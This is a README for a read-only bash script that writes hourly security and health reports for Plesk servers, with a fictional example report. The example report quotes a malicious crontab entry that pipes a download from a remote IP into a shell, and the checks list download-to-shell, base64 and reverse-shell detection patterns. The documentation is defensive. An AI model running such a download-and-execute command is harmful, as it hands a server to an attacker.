# plesk-server-report

[![check](https://github.com/cmelius/plesk-monitoring-server-Report/actions/workflows/check.yml/badge.svg)](https://github.com/cmelius/plesk-monitoring-server-Report/actions/workflows/check.yml)

A single bash script that writes an **hourly health and security report** for a Plesk server on Linux and (optionally) uploads it to cloud storage with [rclone](https://rclone.org/) or mails it to you – to a mailbox on the same server, if you like, so the reports never leave it.

It is built around the most common way a shared Plesk server gets into trouble: **a compromised mailbox or a hacked website starts sending spam**, the server IP ends up on a blocklist, and every customer's mail bounces. It also catches the quieter trouble that customers notice before you do: a full mailbox rejecting mail, a certificate renewal failing, a phone with an outdated password about to get the whole office banned. The report is short plain text you can read yourself – but where it really shines is a daily review by an AI assistant: it reads a 24-hour summary every morning and tells you in a few lines whether anything needs your attention. The reports are written for exactly that; see [Reading the reports](#reading-the-reports) for an example prompt. If you host for customers, mind data protection: an AI review means handing personal data to the AI and storage provider – see [Privacy](#privacy-gdpr) for the options, from a local-only setup to pseudonymised uploads.

The script only **reads** logs and system state. It never changes the server configuration, mail queue or websites.

**Contents**
- **Start:** [Quick start](#quick-start--no-configuration-needed) · [Everything in one folder](#everything-in-one-folder) · [Check it before you run it as root](#check-it-before-you-run-it-as-root)
- **What it does:** [What it found so far](#what-it-found-so-far) · [What the report covers](#what-the-report-covers) · **[Example report](#example-report-fictional-data)**
- **Setup:** [Requirements](#requirements) · [Installation](#installation) · [Storage for the reports](#storage-for-the-reports) · [Reports by mail](#reports-by-mail) · [Configuration](#configuration) · [First run](#first-run)
- **Running it:** [Reading the reports](#reading-the-reports) · [What the script remembers](#what-the-script-remembers) · [Updates](#updates) · [Uninstall](#uninstall)
- **Background:** [Notes and limitations](#notes-and-limitations) · [Security](#security) · [Privacy](#privacy-gdpr) · [Tests](#tests)
- **Help wanted:** [Other mail providers?](#rejections-by-other-mail-providers-help-wanted) · [Using another CMS?](#using-another-cms-help-wanted)
- [License](#license)

> **Built with Claude.** This script was written together with [Claude](https://claude.ai) (Anthropic) and tested against a production Plesk server. On that server, Claude also reads the uploaded reports every morning as a scheduled task, through a Google Drive connector linked to a dedicated account, and sends a push notification when something needs attention. See [Reading the reports](#reading-the-reports). Findings from these daily reviews flow back into the script, see [Updates](#updates).

## Quick start – no configuration needed

The script works out of the box on a standard Plesk 18 (Obsidian) server on Linux – Debian and Ubuntu, RHEL-based systems (AlmaLinux, Rocky Linux) with a few limits, see [Requirements](#requirements). Plesk for Windows is not supported. Every setting further down has a sensible default; you can ignore them until a report shows you something you want to tune.

```bash
curl -fsSL -o /usr/local/sbin/plesk-server-report.sh \
  https://github.com/cmelius/plesk-monitoring-server-Report/releases/latest/download/plesk-server-report.sh
chmod 700 /usr/local/sbin/plesk-server-report.sh
# before the first run: let an AI review it, see "Check it before you run it as root" below
/usr/local/sbin/plesk-server-report.sh --no-upload        # test run: prints the report
echo '5 * * * * root /usr/local/sbin/plesk-server-report.sh' > /etc/cron.d/plesk-server-report
```

**Or: everything in one folder.** Script, configuration, state and previous versions in one place, removed in one go with `rm -rf` – apart from the cron line, nothing in `/etc`, `/var/lib` or `/usr/local/sbin`:

```bash
mkdir -p /opt/plesk-server-report && chmod 700 /opt/plesk-server-report
curl -fsSL -o /opt/plesk-server-report/plesk-server-report.sh \
  https://github.com/cmelius/plesk-monitoring-server-Report/releases/latest/download/plesk-server-report.sh
chmod 700 /opt/plesk-server-report/plesk-server-report.sh
/opt/plesk-server-report/plesk-server-report.sh --no-upload        # test run: prints the report
echo '5 * * * * root /opt/plesk-server-report/plesk-server-report.sh' > /etc/cron.d/plesk-server-report
```

Details, and how to switch an existing installation: [Everything in one folder](#everything-in-one-folder). In a one-folder installation, the commands below that use `/etc/plesk-server-report.conf` go to `plesk-server-report.conf` in that folder, and the state is in `state/` there instead of `/var/lib/plesk-server-report/`.

The `curl` command is for the first installation. From version 1.12.0 on, the script updates itself when you ask it to: `plesk-server-report.sh --self-update` (see [Updates](#updates)).

That's it: from now on a report is written every hour to `/var/lib/plesk-server-report/out/` (in a one-folder installation: `state/out/` in that folder). Four optional extras are worth the few minutes:

1. **Upload** the reports to cloud storage, so you (or an AI assistant) can read them anywhere – [Storage for the reports](#storage-for-the-reports). Without it, the reports stay on the server.
2. **Geolocation** of login IPs: `apt install mmdb-bin` – no configuration needed.
3. **Country alerts:** `echo 'ALLOWED_COUNTRIES="DE AT CH"' >> /etc/plesk-server-report.conf` (your customers' countries).
4. **Mail** instead of (or besides) the upload: `echo 'REPORT_MAIL_TO="admin@example.com"' >> /etc/plesk-server-report.conf` – ideally a mailbox on this server, so the reports never leave it – a daily summary and a mail as soon as something new is wrong. Put the sender on the spam filter whitelist, see [Reports by mail](#reports-by-mail).

The sections below explain everything in detail; you don't need to read them to get started.

### Check it before you run it as root

The script runs as root and has grown to more than 3,000 lines of bash – more than most people will read. Let an AI assistant review it before the first run: attach the file you just downloaded (`/usr/local/sbin/plesk-server-report.sh` – review the exact file you are going to run, not a copy from somewhere else) and ask:

> *Review this bash script before I run it as root from cron on a production Plesk server. Ignore the comments and the documentation – verify everything from the code itself. For every command that writes, deletes, moves or changes permissions of a file, every network connection and every command run with data from logs or the network, quote the line and say what it does. Then tell me whether anything changes the system outside the script's own state directory, could leak data, or could be abused by another local user.*

Why "ignore the comments": a malicious script would be full of reassuring ones. Asking for the quoted line behind every statement makes the answer checkable – and a claim without a line (AI assistants do invent details now and then) stands out. **Check the quoted lines with `grep` before you believe a finding.** In a test, one assistant reported the permission check of the configuration file as broken because its "quote" read `-perm 022` – the script says `-perm /022`, and the slash makes all the difference.

Every push is also checked automatically on GitHub (badge at the top, workflow in `.github/workflows/check.yml`): shell syntax, [ShellCheck](https://www.shellcheck.net/) without a single finding, that `STATE-FILES.md` matches the description built into the script, and the tests in `tests/`. A handful of lines carry a `# shellcheck disable=…` comment with the reason – an awk program or grep pattern in single quotes, for example. ShellCheck says nothing about what the script does, it only rules out a class of shell mistakes; what the checks find is covered by the tests.

The tests (see [Tests](#tests)) are the checks fed with anonymized logs of a real server, once with `mawk` (Debian's awk) and once with `gawk` (RHEL's awk). They show that the script still finds what it found there – they don't replace reading it.

Expect it to point out a few things that are by design:

- **It runs as root** – to read all logs, `/proc`, crontabs and `authorized_keys`. It changes nothing on the server: no IP is blocked, no process stopped, no file removed. The one exception: `--self-update`, started by hand, replaces the script itself.
- **It loads its configuration file as code** (`/etc/plesk-server-report.conf`, or `plesk-server-report.conf` next to the script – see [Installation](#installation); `source`), like most shell-script configurations – an assistant will likely flag this as root code execution. That is by design, and guarded: before loading it, the script checks that the file belongs to root and that nobody else may write it. If not, it **refuses to run** – no check, no report – and says why on stderr (cron mails that to root) and in the system log, with the fix: `chown root:root <file>; chmod 600 <file>`. Your daily review notices the missing reports as well.
- **`/usr/local/sbin` and `/usr/local/bin` come first in its `PATH`**, as in root's usual `PATH`, because cron's minimal `PATH` lacks the Plesk tools. Whoever can write there could replace `curl` or `rclone` – but then every root process on the server is at risk, not only this script.
- **Network connections:** DNS lookups, the upload with rclone, report mails through the local `sendmail`, HTTPS requests to your own domains (with `curl -k`, because the check is meant to find invalid certificates), one request a day to the GitHub API for the latest version, the monthly download of the DB-IP database – and, only with `--self-update` started by hand, the download of the new version from GitHub.
- **It deletes files** only in its own folders: the state folder `/var/lib/plesk-server-report` (temporary files, old reports) and – with `--self-update` – old versions in its backup folder next to the script – mode 700, and with `umask 077` every file it creates is readable by root only –, and reads the Plesk database with `SELECT` only.

Anything beyond that is worth a question – [open an issue](../../issues).

**Young project, frequent updates:** new checks and fixes come out every few days at the moment. They come from the daily review of the reports of a real server: almost every week shows a blind spot, a false alarm or a new kind of attack (see [What it found so far](#what-it-found-so-far)). That is why updating is one command since 1.12.0: `plesk-server-report.sh --self-update` shows what changed, asks, and keeps the previous version for `--rollback`. The daily report tells you when a newer release is available; *Watch → Custom → Releases* on GitHub notifies you as well. See [Updates](#updates).

---

## What it found so far

On the author's production server (Plesk, about 40 customer domains), the first days of reports turned up real problems that had gone unnoticed for months or years:

- **A public backup archive in a customer's website.** A `backup.zip` in the document root was reachable from anywhere – and the access logs showed it being downloaded by scanners.
- **Leftover installer directories** of a forum software, including `phpinfo.php` files that exposed the full PHP configuration.
- **A forgotten `phpinfo.php`** in a directory renamed to "…_DEACTIVATED", still served to anyone.
- **Old database dumps and backup archives** in document roots: UpdraftPlus backups, `wp-config.php` copies and SQL dumps from 2020/2021. Blocked by the web server, but sitting where one wrong rule would expose them.
- **An outdated DKIM key:** the key had been regenerated in Plesk, but the DNS record at the customer's registrar still had the old one, so DKIM failed for every mail.
- **A mail domain with neither SPF nor DKIM**, so its mails were likely rejected or landed in spam. Its DNS is managed by the customer, which is why nobody had noticed.
- **An abandoned WordPress installation** in a site's root, producing PHP errors on every request.
- **Domains that no longer belong on the server:** websites moved to other hosts, parked domains without DNS. These were candidates for cleanup.
- **A targeted login attempt** on the operator's own mailboxes from an unknown IP, among the usual brute-force noise.
- **A distributed WordPress brute-force attack**, which led to the detailed login-attack section: distinct IPs, wp-login vs. xmlrpc, and successful logins after failures.
- **No fail2ban protection for mailboxes.** Plesk ships a jail for Courier IMAP/POP3 but leaves it switched off, so password guessing on mailboxes was never banned. Switching it on had a side effect the report caught right away: three tablets in a customer's shop had been trying an outdated mail password for one and a half years – unnoticed while nothing was banned, now about to get the shop's whole connection blocked. That led to the alert for banned IPs that had logged in successfully before.
- **A spam filter that skipped large mails.** SpamAssassin ignores every mail above its size limit – 256 KB by default in Plesk, exactly the size of spam with image attachments. The report counted the unscanned mails; the limit is now 3 MB.
- **Websites without HSTS or http→https redirect**, found by the daily HTTPS check and fixed – all 40 domains now redirect and send HSTS.
- **SSH keys nobody had looked at.** The access & persistence check listed four keys, one of them for root without a name. It turned out to be the author's own, from 2015 – but until the report listed every key, nobody had checked. Another one had been created by Plesk's SSH terminal for a customer subscription.
- **IPv6 switched on by the hosting provider without notice.** The server's network configuration (the cloud image's default) had always asked for an IPv6 address via DHCPv6, but nobody had answered. One afternoon the provider's network did, and the server had a global IPv6 address. Postfix was set to `inet_protocols = all` (the default), so it would have started sending mail over IPv6 – from an address whose reverse DNS did not resolve back and that no domain's SPF record covered, which Gmail rejects. The next daily check flagged it, before a single mail had gone out over IPv6. Postfix now sends over IPv4 only, the server no longer asks for an IPv6 address, and the report checks the server's addresses every run, so a new one raises an alert within the hour.
- **A full mailbox that rejected mail.** A customer's mailbox reached its size limit, and Plesk rejected incoming mail with `4.2.2 Mailbox full`. The report said nothing – there was no check for it –, and Plesk's notification about exceeded limits goes only to the customer by default; it was noticed by chance. Now the report alerts in the first run after the first rejected mail, and warns once a day before a mailbox is full.
- **Mailboxes without a size limit nobody knew about.** The check of the fill levels showed 19 mailboxes for which neither the mailbox nor its subscription had a limit – eight subscriptions were set to *unlimited*. Such a mailbox never fills up, but it can quietly grow until it fills the disk and every backup. The report now measures them, names the largest and warns from 5 GB. On this server all of them together held less than 400 MB, so nothing to do – but now that is known instead of assumed.
- **Delivery confirmations for spammers.** The table of outgoing deliveries showed a few random-looking domains with only deferred mail. They were confirmations of delivery: spam had requested one, Postfix sent it to the forged sender, and it hung in the queue. Postfix offers this to everyone by default. Now only the server itself may request it, and the report counts confirmations that still go out.
- **A spam filter that checked no links.** While looking into the IPv6 change, the mail log showed `URIBL_BLOCKED`: SpamAssassin asked the URIBL blocklist through the hosting provider's shared DNS resolver, which is far over URIBL's free limit – so URIBL refused to answer, in about every fifth mail, unnoticed. The server's own BIND answers fine; one line in the SpamAssassin configuration fixed it. The report now counts refused blocklist lookups and says how to fix them.
- **A block list nobody can see from outside.** A customer's mail to a public authority was rejected: the authority's mail gateway uses Trend Micro, and Trend Micro had put the server's IP on its *Dial-up User List* – for addresses that look dynamic, which a cloud server's IP sometimes does. Every public blocklist check was clean (Trend Micro's list can't be queried by DNS), the mail never sat in the queue (a permanent rejection is dropped at once), and the bounce went to the customer, not the admin – without the report, the admin learns about it only if the customer happens to mention it. The report showed the rejection; a short request on Trend Micro's lookup page had the IP removed the same day. This led to the *What to do, by who rejected* hints: the report now names the list or provider behind a rejection and how to get the IP removed.

Just as useful: the reports confirmed what is *fine*. Reverse DNS, HELO name and mail server certificates were correct, backups ran, and no mailbox was sending spam.

---

## What the report covers

**Hourly (only log lines written since the previous run):**

| Area | Checks | Alerts when … |
|---|---|---|
| **Outgoing mail / spam** | recipients per sender, mails per authenticated mailbox, distinct client IPs per mailbox, **login ≠ sender domain**, mails injected by scripts (PHP `mail()`, per Plesk subscription), **mail sent through Roundcube webmail** (mailbox, real client IP, recipients), failed webmail logins, deferred/bounced, queue size | a mailbox suddenly sends a lot, is used from many IPs, sends with foreign `From` domains, a website's scripts send mass mail, or a webmail user sends after repeated failed logins |
| **Full mailboxes** | mail rejected because a mailbox here is full (Plesk: `4.2.2 Mailbox full`; Dovecot and others: status `4.2.2`/`5.2.2`, "quota exceeded"); once a day the fill level of every mailbox against its size limit, and the size of mailboxes without a limit | a mailbox rejects mail, is filled to `WARN_MAILBOX_PCT` (default 95 %), or has no limit and is larger than `WARN_MAILBOX_UNLIMITED_GB` (default 5 GB) |
| **Mail forwarding** (Plesk, once a day) | addresses that forward to **other providers** (Gmail, Microsoft …) and what their spam filter does with spam – delete, move to the Spam folder (with or without a copy kept in the mailbox), mark, or no filter at all –, the SpamAssassin size limit (`SA_MAX_MAIL_SIZE`) and the DNS blocklist for incoming mail. Forwarding to a mailbox on the same server, and addresses still entered while forwarding is switched off, are left out | an address forwards to another provider without spam filter (warning). Spam that is only marked – Plesk forwards it –, Plesk's default size limit and a missing blocklist get a recommendation |
| **Reputation** | server IP against Spamhaus, SpamCop, PSBL (Barracuda optional); remote rejections mentioning blocklists, reputation, spam or rate limits (including the wording of Gmail, Microsoft, Apple iCloud, Yahoo, GMX/web.de and T-Online, e.g. "likely unsolicited", "unusual rate", "local policy" [CS01]/[HM08], "excessive volume", "policy restrictions", DMARC rejections), with examples – and **who rejected, with what to do**: for Trend Micro, Spamhaus, Cloudmark, Proofpoint, Barracuda, SpamCop, Microsoft 365, Outlook.com, GMX/WEB.DE, T-Online, Gmail, Yahoo and Apple iCloud the report says where to check the IP (for Trend Micro, Spamhaus, Proofpoint and Cloudmark the link already carries the server's IP) and how to get it removed; mails the spam filter skipped because of their size, and **blocklist lookups of the spam filter that were refused** (`URIBL_BLOCKED` – the DNS resolver is shared and over the lists' free limit); **outgoing deliveries per provider** (sent / deferred / bounced for Microsoft, Google, Apple, GMX/web.de/IONOS, T-Online, …) and **watched recipient domains** | the server IP is listed, recipients reject or throttle mail because of reputation, a delivery to a watched domain fails, or the spam filter's blocklist lookups are refused |
| **Brute force** | failed SMTP/IMAP/POP3 logins, most attacked mailboxes (login names that don't exist marked), fail2ban jails, failed Plesk panel logins with login name and IP | failures spike, **a mailbox fails again and again from an IP that logged in successfully before** (a customer's device with an outdated password – reported before fail2ban bans the whole connection), or a jail bans such an IP (with the login that failed from there) |
| **Intrusion** | successful SSH and Plesk panel logins (the panel user from Plesk's *Action Log*), **new PHP files in `wp-content/uploads`**, **successful WordPress logins during a brute-force attack** | a login comes from a never-seen IP, **an SSH login succeeds for an account not meant for SSH** – a system account, a login shell that refuses logins (`nologin`, `false`: sshd still accepts the key, and a tunnel works without a shell), or a Plesk system user with a full shell not in `ALLOWED_FULL_SHELL_USERS` – also from a known IP (critical), a PHP file appears in an upload folder (also one whose file date was set back to look old), or an IP logs in to WordPress after repeated failures |
| **Reachable from outside** (once a day) | whether **MySQL/MariaDB and PostgreSQL** listen only locally or on public addresses, and what the **firewall rules in the kernel** allow for them and for the **Plesk installer** (port 8447) – from everywhere, only from selected addresses, or nobody. The kernel's rules (`iptables-save`, also for IPv6 when the server has an IPv6 address) count, whatever put them there – the Plesk Firewall, fail2ban, another tool, a command by hand; a note when the Plesk Firewall's own rule says the opposite. Without iptables rules, the Plesk Firewall's rules. A firewall in front of the server (at the hosting provider) is not visible from the server; the report says so | a database listens on a public address and the firewall allows it from everywhere (warning); the installer allowed from everywhere gets a recommendation (`WARN_INSTALLER_OPEN`) |
| **SSH access of the Plesk system users** (once a day) | each subscription's system user (group `psacln`): locked in its web space (*/bin/bash (chrooted)*), a **full shell**, or no SSH; how many get only SFTP (`ForceCommand`); for each full shell, whether its **keys file** can be changed by the account itself – it usually lies in the web space, where the PHP of its sites runs as the same user | a full shell not listed in `ALLOWED_FULL_SHELL_USERS` (warning); a full shell whose keys file the account can change – a hacked site can add an SSH key (warning, also for allowed ones). Accounts sshd refuses (`AllowUsers`, `DenyUsers` …) are only counted |
| **PHP versions** (once a day) | which PHP version each domain uses, which versions are installed, and which are still the default of a service plan (a plan's version is what every new subscription gets) – each with the end of its security support, from php.net (once a day), the built-in table, your own `PHP_EOL`, or estimated from php.net's schedule for a newer 8.x | a domain that **newly** uses a version without security support – also when its version loses support (once, not every day). Versions whose support ends within 90 days, unsupported versions that are only installed or in a plan: recommendations |
| **Access & persistence** | what an attacker leaves behind: **SSH keys** in every account's `authorized_keys` (the files sshd reads, also outside the home folder), accounts with a login shell or UID 0, members of `sudo`/`wheel`/`admin`, sudoers files, `/etc/ld.so.preload`, **cron jobs** (customer crontabs, root, `/etc/cron.*`) and autostart files (`rc.local`, systemd units in `/etc`), **processes** running from `/tmp`, `/dev/shm` or a web folder, from a deleted file or from memory only, or posing as a kernel thread, **listening TCP ports**, the server's **IP addresses** | a key, account, sudo right or port is new or changed (many accounts getting the same shell in one run: one alert), the server has a new public IP address (e.g. IPv6 switched on by the hosting provider), a cron job or autostart file contains a download piped into a shell, base64 decoding, a reverse shell or a program in `/tmp`, root or the system gets a new cron entry, or a suspicious process runs. Compared with the previous run, read only |
| **Geolocation** (optional) | country and network operator of every IP with a successful login (mailboxes, SSH, Plesk panel, WordPress) and of the top failed-login IPs, datacenter networks marked, from a **local** database, so no IP leaves the server; mail logins from datacenters inside the allowed countries are listed for information | a mailbox sends mail, is read via IMAP/POP3, or someone logs in, from a country outside `ALLOWED_COUNTRIES` |
| **Certificates** | failed automatic renewals in Plesk's own log (`panel.log`): domain and the reason Let's Encrypt gives (DNS pointing elsewhere, domain gone, challenge URL blocked) – weeks before the certificate expires | a renewal failed |
| **System** | load, CPU per system user (= subscription), RAM, disks (space and inodes), failed systemd units, OOM killer, **crashing programs** (segfaults & co. in the kernel log, workers of nginx, Apache and PHP-FPM that died by a fatal signal – probing for an exploit of a memory bug makes them crash); once a day whether the deprecated `/etc/rc.local` is still in use and whether **kernel modules of rarely used network protocols** (SCTP, DCCP, TIPC, RDS) are loaded or loadable | thresholds are exceeded, a systemd unit has failed (unless in `IGNORE_FAILED_UNITS`; a failed `rc-local.service` is only a line – the daily check judges `rc.local`), a program crashed (unless in `IGNORE_CRASHES`), `/etc/rc.local` runs commands at boot (warning, `WARN_RC_LOCAL`), one of those kernel modules is loaded (a loadable one gets a recommendation with the command to block it) |
| **Backups** | time, age and status of the latest **Plesk backup** (errors from its `backup.log`), Acronis agent (if installed) | the latest backup is older than `WARN_BACKUP_HOURS` or finished with errors, or the Acronis agent is not running |
| **Web** | requests, 5xx errors, WordPress login POSTs and busiest IP per domain, login-attack details (distinct IPs, wp-login vs. xmlrpc, successful logins, whether xmlrpc.php is blocked), PHP fatal errors with the first message (errors caused by scanners calling WordPress files directly are counted separately), **attack patterns** per domain (SQL injection, path traversal, code execution, XSS) and how many were answered with 200, **probes for sensitive files** (`.env`, `.git`, dumps, backups, config copies), **traffic peaks** (busiest minute) and URLs requested by unusually many IPs, **ModSecurity** hits and top rules | a domain throws many 5xx/fatal errors, a sensitive file was served with 200 *and* exists on disk, a traffic peak exceeds `WARN_REQ_PER_MIN`, or one URL is hit by a botnet-sized number of IPs |

**Once a day (first run after midnight):** the **fill level of every mailbox** against its size limit (warning from 95 %); recently changed PHP files with typical backdoor code, and **`.htaccess`/`.user.ini` settings that run attacker code** (a file loaded before every PHP request via `auto_prepend_file` – known security plugins like Wordfence excepted –, PHP executed for image files, the signature of a widespread WordPress malware campaign); publicly reachable sensitive files; pending (security) updates – kernel updates included – and reboot-required (also when a newer kernel is installed than the one running), **pending updates of Plesk's own packages** listed apart (Plesk ships fixes for its nginx in `sw-nginx`/`sw-cp-server`, often before nginx.org releases a new version, and the package manager doesn't count them as security updates – a pending one of Plesk's nginx is a warning), **the nginx that runs** – for the websites and for the Plesk panel – with its version, the package it comes from (Plesk's, the distribution's, or none: compiled by hand) and its dynamic modules (a warning when an update replaced the program on disk but the old one still runs), **kernel modules of rarely used network protocols** that any process could load (see [Notes](#notes-and-limitations)), **mail forwarding to other providers** – does the spam filter delete spam before Plesk forwards it? (see [Notes](#notes-and-limitations)), whether a newer release of this script is available, TLS certificates of all Plesk domains and the panel (expiry < 14 days), **HSTS and http→https redirect** on every domain with a valid certificate (a recommendation, no alert), and **SPF, DKIM and DMARC of every domain with mail service**: does SPF allow this server (including `include:`, `a`, `mx`), does the DKIM key in DNS match the key Plesk signs with, is there a DMARC policy (a missing one is listed as a recommendation), and where are MX and DNS hosted. That last part is especially useful for domains whose DNS you don't manage yourself. SPF errors that make receivers reject mail outright are flagged too: several SPF records, more than 10 DNS lookups, or `+all`.

**Also once a day, server and domain DNS:**
- **reverse DNS (PTR)** of the server IP, forward-confirmed, and whether Postfix's HELO name resolves to the server. Without a PTR record, Gmail, Microsoft and others reject mail from *all* domains on the server.
- **IPv6** (automatic, only if the server has a global IPv6 address and Postfix uses it): PTR for IPv6, and SPF also evaluated for the IPv6 address
- **certificates of the mail server** on ports 25/587 (STARTTLS), 465, 993 and 995: valid for the host name mail clients use (`MAIL_TLS_NAME`, default: the server's host name), and expiry
- per Plesk domain: does the website **still point to this server** (moved domains, CDNs), does a **CAA** record block Let's Encrypt renewals, does the domain resolve at all (**broken DNSSEC**, dead name servers), and is the domain **listed on Spamhaus DBL / SURBL** (typical for hacked sites serving phishing)

### Example report (fictional data)

The report is ordered by theme – **MAIL, ACCESS, WEB, SYSTEM** –, the alerts at the top too (grouped, the critical ones first in each theme). Each theme starts with `######## THEME ########` between two lines of `#`, then the sections of the checks that read the logs since the last run, then `== THEME – daily checks (as of …) ==` with the newest results of the daily checks of that theme. Which check goes where:

| Theme | Every run | Daily checks |
|---|---|---|
| MAIL | delivery & spam filter, senders & logins, failed logins, webmail | server DNS (PTR, HELO), mail server certificates, SPF/DKIM/DMARC, mailboxes, mail forwarding |
| ACCESS | successful logins, failed Plesk panel logins, fail2ban, access & persistence | reachable from outside (firewall, databases, installer), SSH access of the system users |
| WEB | requests and attacks, PHP files in upload folders, failed certificate renewals | TLS certificates, HTTPS, domain DNS, exposed files, suspicious code |
| SYSTEM | load, CPU, RAM, filesystems, services, backups | updates and script version, kernel modules, PHP versions, rc.local |

```
Server report host.example.com – 2026-10-26 10:05 UTC – plesk-server-report v1.22.0
STATUS: WARNING (14)
MAIL (7):
 ! Mail: mailbox info@shop.example submitted 140 mails after logins from outside DE AT CH: 192.0.2.15 (BR, Example Cloud Ltd [datacenter]) 203.0.113.99 (VN, Example Telecom) – password compromised?
 ! Mail: mailbox info@shop.example used from 12 different IPs – password compromised?
 ! Mail: mailbox info@shop.example sent 140 mails with a foreign sender domain – spam?
 ! Mail: support@bank-secure.example sent to 700 recipients from this server (mailbox login or script)
 ! Mail: 61 rejections by remote servers mentioning a blocklist, reputation, spam or rate limit – check the server IP and the examples (rejected by: Gmail, Outlook.com/Hotmail, Apple iCloud – what to do: see the report)
 ! Mail: mailbox info@shop.example logged in via IMAP/POP3 from a new country outside DE AT CH: 192.0.2.15 (BR, Example Cloud Ltd [datacenter], 48.3 MB of mail read) – travelling, or password compromised?
 ! Mail: 4 failed logins of info@lawfirm.example from 198.51.100.44 (AT, Example Kabel GmbH) – other mailboxes logged in successfully from there: jane@lawfirm.example. A device with an outdated password? Correct it on the device before fail2ban bans the IP (and with it the whole connection)
ACCESS (2):
 ! Cron: new entry with suspicious content in crontab of shop_web: */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh – check it
 ! fail2ban: jail plesk-courierimap bans 198.51.100.77 (DE, Example Kabel GmbH), which had successful logins before (mail logins of office@lawfirm.example (last 2026-10-25)); failed logins from there: iphone@oldname.example ×5 (no such mailbox) – a device still set up for a mailbox that doesn't exist (any more)? Remove that account from the device. Unban: fail2ban-client set plesk-courierimap unbanip 198.51.100.77
WEB (4):
 ! Web: shop.example served the sensitive file /.env (HTTP 200, file exists) – a request in the access log since the last run; remove the file or block access, and assume it was downloaded
 ! Web: 2 new PHP file(s) in wp-content/uploads – possible malware
 ! Web: shop.example exposes /.env publicly (HTTP 200) – remove it from the document root or block access, then check again: plesk-server-report.sh --only exposed
 ! Web: blog.example logged 48 PHP fatal errors
SYSTEM (1):
 ! Updates: 3 security update(s) pending

######################
######## MAIL ########
######################

== MAIL: delivery & spam filter ==
Source: /var/log/maillog, 5212 new lines
Delivered: 548 | deferred: 87 | bounced: 34 | queue: 4
Rejections mentioning blocklist/reputation/spam/rate limit: 61
  example: Oct 26 09:41:12 gmail.com: host gmail-smtp-in.l.google.com[192.0.2.26] said: 421-4.7.28 [203.0.113.10] Gmail has detected an unusual rate of unsolicited mail originating from your IP address. To protect our users from spam, mail sent from your IP addr
  example: Oct 26 09:44:03 outlook.com: host outlook-com.olc.protection.outlook.com[192.0.2.40] said: 451 4.7.650 The mail server [203.0.113.10] has been temporarily rate limited due to IP reputation. (in reply to MAIL FROM command))
  example: Oct 26 09:52:37 icloud.com: host mx01.mail.icloud.com[192.0.2.61] said: 550 5.7.1 Your message was rejected due to icloud.com's local policy [CS01] (in reply to end of DATA command))
  What to do, by who rejected (the IP is 203.0.113.10):
    Gmail (38×): no removal form – Gmail's reputation recovers once the cause stops; check SPF, DKIM and DMARC of the sending domain; Google Postmaster Tools (https://postmaster.google.com) shows the reputation
    Outlook.com/Hotmail (17×): request removal at https://sender.office.com; if the block stays, use the form at https://olcsupport.office.com
    Apple iCloud (6×): local policy of Apple, no removal list – check SPF, DKIM and DMARC; postmaster information at https://support.apple.com/en-us/HT204137
Rejections of forwarded mail: 3 (forwarding here, sender rewritten with SRS – not sent by a customer, but forwarded spam still counts against this server's IP; check the spam action of the forwarding address, daily check forwarding)
  mobil@lawfirm.example → jane.doe@gmail.com: 3 rejected (original sender: spam-sender.example)
  example (forwarded): Oct 26 08:12:40 gmail.com: host gmail-smtp-in.l.google.com[192.0.2.26] said: 421-4.7.28 Gmail has detected an unusual rate of mail originating from your DKIM 421-4.7.28 domain [spam-sender.example 36]. …
Outgoing deliveries per receiving mail server (provider or MX host; sent / deferred attempts (mails) / bounced):
  google                   310 / 52 (9 mails) / 18
  microsoft                141 / 29 (7 mails) / 11
  gmx/web.de/ionos          47 / 0 / 2
  apple icloud              12 / 6 (2 mails) / 3
  t-online                   9 / 0 / 0
  mailhost.example           6 / 0 / 0
Watched recipient domain invoices.example.com: 3 sent, 0 deferred, 0 bounced
Spam filter: all mails scanned – none above the size limit (limit 3.0 MB = 3145728 bytes, Plesk: SA_MAX_MAIL_SIZE in /etc/psa/psa.conf)
Spam filter: blocklist lookups answered (412 mail(s) scanned)
DNS blocklists for 203.0.113.10 (all queried via 127.0.0.1): zen.spamhaus.org:clean bl.spamcop.net:clean psbl.surriel.com:clean

== MAIL: senders & logins ==
Top senders (total recipients):
     700  support@bank-secure.example
      12  office@agency.example
       6  <> (bounce)
       4  newsletter@shop.example

Authenticated mailboxes (mails, distinct IPs; IPs with country/operator, mails per IP):
     140  12 IPs  info@shop.example
          192.0.2.15 (BR, Example Cloud Ltd [datacenter]) ×61, 203.0.113.99 (VN, Example Telecom) ×40, 192.0.2.201 (BR, Example Cloud Ltd [datacenter]) ×20, 198.51.100.4 (DE, Example Telekom AG) ×3, …
       9   1 IPs  office@agency.example
          198.51.100.20 (DE, Example Telekom AG) ×9
       3   1 IPs  jane@lawfirm.example
          198.51.100.44 (AT, Example Kabel GmbH) ×3

IMAP/POP3 logins (logins, mailbox, IP) from outside ALLOWED_COUNTRIES:
      14  info@shop.example  from 192.0.2.15 (BR, Example Cloud Ltd [datacenter])  – 48.3 MB of mail read  – first login from BR
       6  jane@lawfirm.example  from 198.51.100.90 (ES, Example Movil S.A.)  – 312 KB of mail read
  (86 logins of 23 mailboxes from 31 IPs checked)

Mailboxes sending with a foreign sender domain (login ≠ from):
     140  info@shop.example – e.g. support@bank-secure.example

Mails sent by scripts (system user = subscription):
       4  uid 10012  shopexample  /var/www/vhosts/shop.example
       2  uid 30  popuser  /var/qmail/popuser
       1  uid 999  psaadm  /opt/psa/admin

== MAIL: failed logins ==
Failed mail logins: SMTP 64 | IMAP/POP3 3 – top IPs:
       9  192.0.2.200 (NL, Example Hosting B.V. [datacenter])
       3  198.51.100.66 (US, Example Cloud Ltd [datacenter])
       1  203.0.113.45 (CN, Example Telecom)
Most attacked mailboxes (failed SMTP/IMAP/POP3 logins):
       8  admin@agency.example  – no such mailbox
       4  info@lawfirm.example
       3  jane
  Login names that don't exist: 3 (11 attempts) – guessed by attackers, or a device of a deleted mailbox
Failed logins from IPs with earlier successful mail logins (device with an outdated password?):
       4  info@lawfirm.example from 198.51.100.44 (AT, Example Kabel GmbH) – other mailboxes logged in successfully from there: jane@lawfirm.example

== MAIL: webmail (Roundcube) ==
Webmail (Roundcube) – mails sent (mails, recipients, IPs):
       4      5 rcpt   1 IPs  office@agency.example
          198.51.100.20 (DE, Example Telekom AG) ×4
Failed webmail logins: 12 – top IPs:
       7  192.0.2.200 (NL, Example Hosting B.V. [datacenter])
       2  203.0.113.80 (US, Example Cable Inc.)
Most attacked mailboxes (failed webmail logins):
       9  info@lawfirm.example
       3  admin@agency.example

== MAIL – daily checks (as of 2026-10-26 01:05 UTC) ==
Server DNS (reverse DNS / HELO):
